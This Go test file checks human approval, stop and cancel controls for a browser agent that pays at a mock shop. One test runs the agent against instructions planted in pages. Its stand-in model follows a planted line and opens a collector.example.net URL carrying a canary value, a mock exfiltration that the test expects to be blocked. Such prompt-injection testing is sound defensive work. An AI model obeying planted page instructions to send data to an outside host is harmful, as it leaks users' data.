// SPDX-FileCopyrightText: 2026 Rashik Adhikari
// SPDX-License-Identifier: AGPL-3.0-or-later OR LicenseRef-Quilzo-Commercial

package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/quilzo/quilzo/internal/agent"
	"github.com/quilzo/quilzo/internal/audit"
	"github.com/quilzo/quilzo/internal/browser"
	"github.com/quilzo/quilzo/internal/cdp"
	"github.com/quilzo/quilzo/internal/evals"
)

// testChromium is a Chromium on this machine, or the test is skipped.
func testChromium(t *testing.T) string {
	t.Helper()
	if p := os.Getenv("QUILZO_TEST_CHROMIUM"); p != "" {
		return p
	}
	home, _ := os.UserHomeDir()
	found, _ := filepath.Glob(filepath.Join(home, ".cache/ms-playwright/chromium_headless_shell-*/chrome-headless-shell-linux64/chrome-headless-shell"))
	if len(found) == 0 {
		t.Skip("no Chromium here (set QUILZO_TEST_CHROMIUM)")
	}
	return found[len(found)-1]
}

// shopRun declares an agent that may pay at shop.example.com, puts a shop
// there, and a model that opens the cart, presses Pay now and says it is
// done. It reports how often the shop was paid.
func shopRun(t *testing.T) (root string, paid func() int) {
	t.Helper()
	return shopRunWith(t, false)
}

// shopRunWith is shopRun with a model that, when follow is set, does what
// a planted instruction to open another site says.
func shopRunWith(t *testing.T, follow bool) (root string, paid func() int) {
	t.Helper()
	path := testChromium(t)
	t.Setenv("HOME", t.TempDir())
	root = demoStore(t)
	declaredAutonomy(t, root)

	var mu sync.Mutex
	n := 0
	shop := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.URL.Path == "/pay" && r.Method == http.MethodPost:
			mu.Lock()
			n++
			mu.Unlock()
			fmt.Fprint(w, `<!doctype html><title>Paid</title><h1>Paid</h1>`)
		default:
			fmt.Fprint(w, `<!doctype html><title>Cart</title><h1>Cart</h1><p>One box of paper.</p>`+
				`<form method=post action="/pay"><button>Pay now</button></form>`)
		}
	}))
	t.Cleanup(shop.Close)
	port := shop.Listener.Addr().(interface{ String() string }).String()
	port = port[strings.LastIndexByte(port, ':')+1:]
	browserTestLaunch = func(ctx context.Context) (*cdp.Browser, error) {
		return cdp.Launch(ctx, cdp.Options{Path: path, Profile: filepath.Join(t.TempDir(), "p"), Stderr: io.Discard,
			Args: []string{"--proxy-server=direct://", "--proxy-bypass-list=*", "--ignore-certificate-errors",
				"--host-resolver-rules=MAP shop.example.com:443 127.0.0.1:" + port}})
	}
	t.Cleanup(func() { browserTestLaunch = nil })

	pay := regexp.MustCompile(`\[(e\d+)\] button \\"Pay now\\"`)
	model := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		body := string(b)
		// What the model decides on is the page now: the last thing it
		// was shown.
		last := body
		if i := strings.LastIndex(body, "[browser_"); i >= 0 {
			last = body[i:]
		}
		choice := `{"op":"browser_open","input":{"url":"https://shop.example.com/cart"}}`
		switch {
		case strings.Contains(last, "Paid") || strings.Contains(last, "declined") ||
			strings.Contains(last, "refused") || strings.Contains(last, "failed"):
			choice = `{"op":"done","say":"finished"}`
		case follow && strings.Contains(last, "open https://collector.example.net"):
			choice = `{"op":"browser_open","input":{"url":"https://collector.example.net/c?d=` + evals.Canary + `"}}`
		case pay.MatchString(last):
			choice = fmt.Sprintf(`{"op":"browser_click","input":{"ref":"%s"}}`, pay.FindStringSubmatch(last)[1])
		}
		out, _ := json.Marshal(map[string]any{"choices": []any{map[string]any{
			"message": map[string]any{"role": "assistant", "content": choice}}}})
		w.Header().Set("Content-Type", "application/json")
		w.Write(out)
	}))
	t.Cleanup(model.Close)
	t.Setenv("QUILZO_MODEL_URL", model.URL+"/v1")
	t.Setenv("QUILZO_MODEL", "stand-in")
	t.Setenv("QUILZO_MODEL_KEY", "")

	m := agent.Manifest{Name: "buyer", Kind: agent.KindTask, Purpose: "Pay the supplier's invoice",
		Capabilities: []string{"browser_open", "browser_read", "browser_click"}, Autonomy: agent.AutonomyDraft,
		Browser: &agent.Browser{Write: []string{"shop.example.com"}},
		Budget:  agent.Budget{Steps: 8, Tools: 1, Duration: agent.Duration(2 * time.Minute)}}
	if err := declareAgent(root, m, true, asAdmin("dana")); err != nil {
		t.Fatal(err)
	}
	return root, func() int { mu.Lock(); defer mu.Unlock(); return n }
}

// A model drives the browser through a real run: it opens the cart, and
// pressing Pay now waits in the run for a person, who sees a picture of
// the page with the button outlined; once they agree, it pays, once.
func TestABrowserRunPaysOnlyOnceAPersonAgrees(t *testing.T) {
	root, paid := shopRun(t)
	answered := answerAgentWhenAsked(t, root, "buyer", true, "lee")
	id, out, err := runAgentKeptBy(context.Background(), root, "buyer", "pay the invoice", true, false, asAdmin("dana"))
	if aerr := <-answered; aerr != nil {
		t.Fatalf("answering: %v (%v)\n%s", aerr, err, describeRun(out.Trace))
	}
	if err != nil {
		t.Fatal(err)
	}
	if !out.Trace.Complete || paid() != 1 {
		t.Fatalf("paid %d times; the run: %+v", paid(), out.Trace)
	}
	rec, err := loadAgentRun(root, id)
	if err != nil {
		t.Fatal(err)
	}
	if len(rec.Answers) != 1 || !rec.Answers[0].Approve || rec.Answers[0].By != "lee" {
		t.Errorf("answers: %+v", rec.Answers)
	}
	frames, err := loadRunFrames(root, id)
	if err != nil {
		t.Fatal(err)
	}
	asked := 0
	for _, f := range frames {
		if strings.Contains(f.Asking, `"Pay now"`) {
			asked = f.N
		}
	}
	if asked == 0 {
		t.Fatalf("no picture of what the person was asked about: %+v", frames)
	}
	pic, err := runFramePicture(root, id, asked)
	if err != nil || len(pic) < 2 || pic[0] != 0xFF || pic[1] != 0xD8 {
		t.Errorf("the picture is not a JPEG: %v", err)
	}
}

// Declined, nothing is paid, and the model is told who declined.
func TestABrowserRunThatIsDeclinedPaysNothing(t *testing.T) {
	root, paid := shopRun(t)
	answered := answerAgentWhenAsked(t, root, "buyer", false, "lee")
	_, out, err := runAgentKeptBy(context.Background(), root, "buyer", "pay the invoice", true, false, asAdmin("dana"))
	if aerr := <-answered; aerr != nil {
		t.Fatalf("answering: %v (%v)\n%s", aerr, err, describeRun(out.Trace))
	}
	if err != nil {
		t.Fatal(err)
	}
	if paid() != 0 {
		t.Fatal("paid after a person declined")
	}
	declined := false
	for _, st := range out.Trace.Steps {
		declined = declined || strings.Contains(st.Why, "lee declined this")
	}
	if !declined {
		t.Errorf("the run: %+v", out.Trace.Steps)
	}
}

// describeRun is a run's steps, for a failure message.
func describeRun(tr agent.Trace) string {
	var b strings.Builder
	fmt.Fprintf(&b, "stopped: %q, complete %v\n", tr.Stopped, tr.Complete)
	for _, st := range tr.Steps {
		fmt.Fprintf(&b, "  %d %s %v allowed=%v why=%q err=%q result=%.200q\n", st.N, st.Action.Op, st.Action.Input, st.Allowed, st.Why, st.Err, st.Result)
	}
	return b.String()
}

// Whoever starts a run leaves its browser as declared; a read-only
// credential leaves it only reading.
func TestAReadOnlyCredentialsBrowserOnlyReads(t *testing.T) {
	m := agent.Manifest{Name: "buyer", Kind: agent.KindTask, Purpose: "x",
		Capabilities: []string{"browser_open", "browser_click", "browser_sign_in"}, Autonomy: agent.AutonomyDraft,
		Browser: &agent.Browser{Read: []string{"docs.example.com"}, Write: []string{"shop.example.com"},
			Credentials: []agent.BrowserCredential{{Secret: "shop", Host: "shop.example.com"}}},
		Budget: agent.Budget{Steps: 8, Tools: 1, Duration: agent.Duration(time.Minute)}}
	c := asAdmin("dana")
	b := narrowedBy(m, c).Browser
	if b == nil || !b.Writes("shop.example.com") || !b.Reads("docs.example.com") || len(b.Credentials) != 1 {
		t.Fatalf("an admin's run has the browser %+v", b)
	}
	c.Limits.ReadOnly = true
	b = narrowedBy(m, c).Browser
	if b == nil || !b.Reads("shop.example.com") || !b.Reads("docs.example.com") || len(b.Write) != 0 || len(b.Credentials) != 0 {
		t.Errorf("a read-only credential's run has the browser %+v", b)
	}
	if narrowedBy(m, nil).Browser != nil {
		t.Error("a run nobody resolved has a browser")
	}
}

// Started from the screen, a browser run comes back at once with its
// identifier, so the person is on its page when it asks them, and goes
// on in this process once they answer.
func TestABrowserRunFromTheScreenComesBackAtOnce(t *testing.T) {
	root, paid := shopRun(t)
	start := time.Now()
	id, err := runAgentOnce(root, "buyer", "pay the invoice", true, asAdmin("dana"))
	if err != nil {
		t.Fatal(err)
	}
	if took := time.Since(start); took > 5*time.Second {
		t.Errorf("starting it took %v", took)
	}
	if rec, err := loadAgentRun(root, id); err != nil || rec.OutcomeAt(time.Now()) != "running" {
		t.Fatalf("the run's page is not there to look at: %v", err)
	}
	if err := <-answerAgentWhenAsked(t, root, "buyer", true, "lee"); err != nil {
		t.Fatal(err)
	}
	deadline := time.Now().Add(time.Minute)
	for time.Now().Before(deadline) {
		rec, _ := loadAgentRun(root, id)
		if o := rec.OutcomeAt(time.Now()); o != "running" && o != "waiting" {
			if paid() != 1 || !rec.Trace.Complete {
				t.Fatalf("paid %d times\n%s", paid(), describeRun(rec.Trace))
			}
			return
		}
		time.Sleep(100 * time.Millisecond)
	}
	t.Fatal("the run did not finish")
}

// A person stops a run while it waits on them: nothing is paid, the run
// says who stopped it, and what the browser showed now is gone with it.
func TestStoppingABrowserRunEndsItWhereItIs(t *testing.T) {
	root, paid := shopRun(t)
	id, err := runAgentOnce(root, "buyer", "pay the invoice", true, asAdmin("dana"))
	if err != nil {
		t.Fatal(err)
	}
	deadline := time.Now().Add(time.Minute)
	for {
		rec, _ := loadAgentRun(root, id)
		if w := rec.Trace.Waiting; w != nil && w.Live {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("the run never asked\n%s", describeRun(rec.Trace))
		}
		time.Sleep(50 * time.Millisecond)
	}
	if err := stopRun(root, id, &Caller{Name: "a-model", Kind: audit.KindAI}, time.Now()); err == nil {
		t.Error("a model stopped a run")
	}
	if err := stopRun(root, id, asAdmin("lee"), time.Now()); err != nil {
		t.Fatal(err)
	}
	var rec agent.Record
	for time.Now().Before(deadline) {
		rec, _ = loadAgentRun(root, id)
		if o := rec.OutcomeAt(time.Now()); o != "running" && o != "waiting" {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	if rec.Trace.Stopped != "stopped by lee" || paid() != 0 {
		t.Fatalf("paid %d times\n%s", paid(), describeRun(rec.Trace))
	}
	if path, _ := liveFrame(root, id); path != "" {
		t.Error("the picture of now outlived the run")
	}
	if _, err := os.Stat(stopPath(root, id)); err == nil {
		t.Error("the note to stop outlived the run")
	}
	if err := stopRun(root, id, asAdmin("lee"), time.Now()); err == nil || !strings.Contains(err.Error(), "not going on") {
		t.Errorf("a finished run was asked to stop: %v", err)
	}
}

// Evaluated, a browser agent reads for real and sends nothing: it is
// given the plants web pages carry beside the others, each tried as often
// as asked, and one it follows is reported with what stopped it.
func TestABrowserAgentIsEvaluatedAgainstWhatPagesPlant(t *testing.T) {
	root, paid := shopRunWith(t, true)
	if err := saveEvalCases(root, "buyer", []evals.Case{{ID: evals.NewID(), Goal: "pay the invoice",
		Expect: evals.Expect{Uses: []string{"browser_open"}}}}); err != nil {
		t.Fatal(err)
	}
	rep, err := runEvaluationWith(root, "buyer", evals.Options{K: 1, Attempts: 2}, true, asAdmin("dana"))
	if err != nil {
		t.Fatal(err)
	}
	if paid() != 0 {
		t.Fatal("an evaluation paid")
	}
	if rep.Attempts != 2 || len(rep.Results) != 1 {
		t.Fatalf("%+v", rep)
	}
	c := rep.Results[0]
	if want := 2 * (len(evals.Plants) + len(evals.BrowserPlants)); len(c.Planted) != want {
		t.Errorf("%d planted runs, want %d", len(c.Planted), want)
	}
	if !c.Hijacked || !c.HijackedFirst || rep.Hijacked != 1 || rep.HijackedFirst != 1 {
		t.Errorf("the plant it followed was not counted: %+v", c)
	}
	found := false
	for _, rr := range c.Planted {
		if strings.Contains(rr.Hijacked, "browser_open") && strings.Contains(rr.Hijacked, "not a host this agent may reach") {
			found = true
		}
	}
	if !found {
		t.Errorf("no attempt says what stopped it: %+v", c.Planted)
	}
}

// An evaluation's browser, and the browser of an agent held to proposing,
// only read.
func TestAnAgentThatOnlyProposesSendsNothingThroughItsBrowser(t *testing.T) {
	root, _ := shopRun(t)
	set, err := loadAgents(root)
	if err != nil {
		t.Fatal(err)
	}
	m, _, err := boundManifest(root, set, "buyer", true, false, asAdmin("dana"))
	if err != nil || !m.Browser.Writes("shop.example.com") {
		t.Fatalf("a run at its declared autonomy: %+v %v", m.Browser, err)
	}
	m, _, err = boundManifest(root, set, "buyer", true, true, asAdmin("dana"))
	if err != nil || m.Browser.Writes("shop.example.com") || !m.Browser.Reads("shop.example.com") {
		t.Errorf("an evaluation's browser: %+v %v", m.Browser, err)
	}
	proposer := set.Agents["buyer"]
	proposer.Autonomy = agent.AutonomyPropose
	set.Agents["buyer"] = proposer
	m, _, err = boundManifest(root, set, "buyer", true, false, asAdmin("dana"))
	if err != nil || m.Browser.Writes("shop.example.com") || !m.Browser.Reads("shop.example.com") {
		t.Errorf("a proposing agent's browser: %+v %v", m.Browser, err)
	}
}

// A browser that fails to start gives its place back: with room for one,
// a run whose launches keep failing does not shut out the next.
func TestAFailedLaunchGivesItsPlaceBack(t *testing.T) {
	root, _ := shopRun(t)
	cfg, err := loadConfig(root)
	if err != nil {
		t.Fatal(err)
	}
	if err := cfg.Set("browser.sessions", "1", "a test about places", "test"); err != nil {
		t.Fatal(err)
	}
	if err := saveConfig(root, cfg); err != nil {
		t.Fatal(err)
	}
	working := browserTestLaunch
	browserTestLaunch = func(context.Context) (*cdp.Browser, error) { return nil, fmt.Errorf("it would not start") }
	set, _ := loadAgents(root)
	m := set.Agents["buyer"]
	rb, err := newRunBrowser(root, m, agent.NewSession(m, nil), asAdmin("dana"), nil, "", false)
	if err != nil {
		t.Fatal(err)
	}
	defer rb.end()
	open := agent.Action{Op: "browser_open", Input: map[string]any{"url": "https://shop.example.com/cart"}}
	for i := 0; i < 3; i++ {
		ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		_, err := rb.driver.Perform(nil)(ctx, open)
		cancel()
		if err == nil || !strings.Contains(err.Error(), "would not start") {
			t.Fatalf("attempt %d: %v", i+1, err)
		}
	}
	browserTestLaunch = working
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	release, err := takeBrowserSlot(ctx, root, "another", 1, nil)
	if err != nil {
		t.Fatalf("the failed launches kept the only place: %v", err)
	}
	release()
}

// A run continued keeps the pictures it took, numbering on after them.
func TestAContinuedRunKeepsItsPictures(t *testing.T) {
	root := t.TempDir()
	f := &runFrames{root: root, id: "run-20261010-0000abcd"}
	f.keep(browser.Frame{Op: "browser_open", JPEG: []byte{0xFF, 0xD8, 1}})
	f.keep(browser.Frame{Op: "browser_click", JPEG: []byte{0xFF, 0xD8, 2}})
	kept, _ := loadRunFrames(root, f.id)
	g := &runFrames{root: root, id: f.id, index: kept}
	g.keep(browser.Frame{Op: "browser_read", JPEG: []byte{0xFF, 0xD8, 3}})
	all, _ := loadRunFrames(root, f.id)
	if len(all) != 3 || all[2].N != 3 {
		t.Fatalf("%+v", all)
	}
	if b, _ := runFramePicture(root, f.id, 1); len(b) != 3 || b[2] != 1 {
		t.Errorf("the first picture was replaced: %v", b)
	}
}

// An evaluation's run is never taken on as a real one.
func TestAnEvaluationsRunIsNotContinued(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	root := demoStore(t)
	rec := agent.Keep("run-20261010-0000eeee", "dana", "a-model", time.Now(), agent.Trace{Agent: "buyer", Goal: "g",
		Waiting: &agent.Pending{N: 1, Since: time.Now(), Action: agent.Action{Op: "browser_click"}}}, agent.Receipt{})
	rec.Eval = "eval-20261010T000000"
	if err := writeAgentRun(root, rec); err != nil {
		t.Fatal(err)
	}
	if _, err := continueAgentRun(context.Background(), root, rec.ID, &agent.Verdict{N: 1, Approve: true}, asAdmin("lee")); err == nil ||
		!strings.Contains(err.Error(), "evaluation") {
		t.Errorf("approving an evaluation's run: %v", err)
	}
	if _, err := replayAgentRun(context.Background(), root, rec.ID, 0, asAdmin("lee")); err == nil || !strings.Contains(err.Error(), "evaluation") {
		t.Errorf("replaying an evaluation's run: %v", err)
	}
}

// A request to stop made before the run's process began watching, but
// after the run was asked for, still stops it.
func TestAStopAskedForAsARunStartsIsNotLost(t *testing.T) {
	root := t.TempDir()
	id := "run-20261010-0000ffff"
	if err := os.MkdirAll(agentRunsDir(root), 0o700); err != nil {
		t.Fatal(err)
	}
	since := time.Now()
	b, _ := json.Marshal(stopNote{By: "lee", At: since.Add(time.Millisecond)})
	if err := os.WriteFile(stopPath(root, id), b, 0o600); err != nil {
		t.Fatal(err)
	}
	ctx, stopped := watchStop(context.Background(), root, id, since)
	select {
	case <-ctx.Done():
	case <-time.After(3 * time.Second):
		t.Fatal("the stop was lost")
	}
	if by := stopped(); by != "lee" {
		t.Errorf("stopped by %q", by)
	}
	// One from an earlier stretch is not about this one.
	b, _ = json.Marshal(stopNote{By: "sam", At: since.Add(-time.Hour)})
	_ = os.WriteFile(stopPath(root, id), b, 0o600)
	ctx, stopped = watchStop(context.Background(), root, id, since)
	select {
	case <-ctx.Done():
		t.Error("an old stop stopped a new stretch")
	case <-time.After(1500 * time.Millisecond):
	}
	stopped()
}

// Cancelled through A2A while it waits on a person, a browser run stops
// in its process and stays stopped; nothing is paid.
func TestCancellingABrowserRunStopsIt(t *testing.T) {
	root, paid := shopRun(t)
	id, err := runAgentOnce(root, "buyer", "pay the invoice", true, asAdmin("dana"))
	if err != nil {
		t.Fatal(err)
	}
	deadline := time.Now().Add(time.Minute)
	for {
		rec, _ := loadAgentRun(root, id)
		if w := rec.Trace.Waiting; w != nil && w.Live {
			break
		}
		if time.Now().After(deadline) {
			t.Fatal("the run never asked")
		}
		time.Sleep(50 * time.Millisecond)
	}
	if _, err := cancelAgentRun(root, id, asAdmin("ana"), ""); err != nil {
		t.Fatal(err)
	}
	var rec agent.Record
	for time.Now().Before(deadline) {
		rec, _ = loadAgentRun(root, id)
		if !goingOn(rec, time.Now()) {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	time.Sleep(time.Second)
	rec, _ = loadAgentRun(root, id)
	if rec.Trace.Stopped != "canceled by ana" || paid() != 0 || goingOn(rec, time.Now()) {
		t.Errorf("paid %d\n%s", paid(), describeRun(rec.Trace))
	}
}
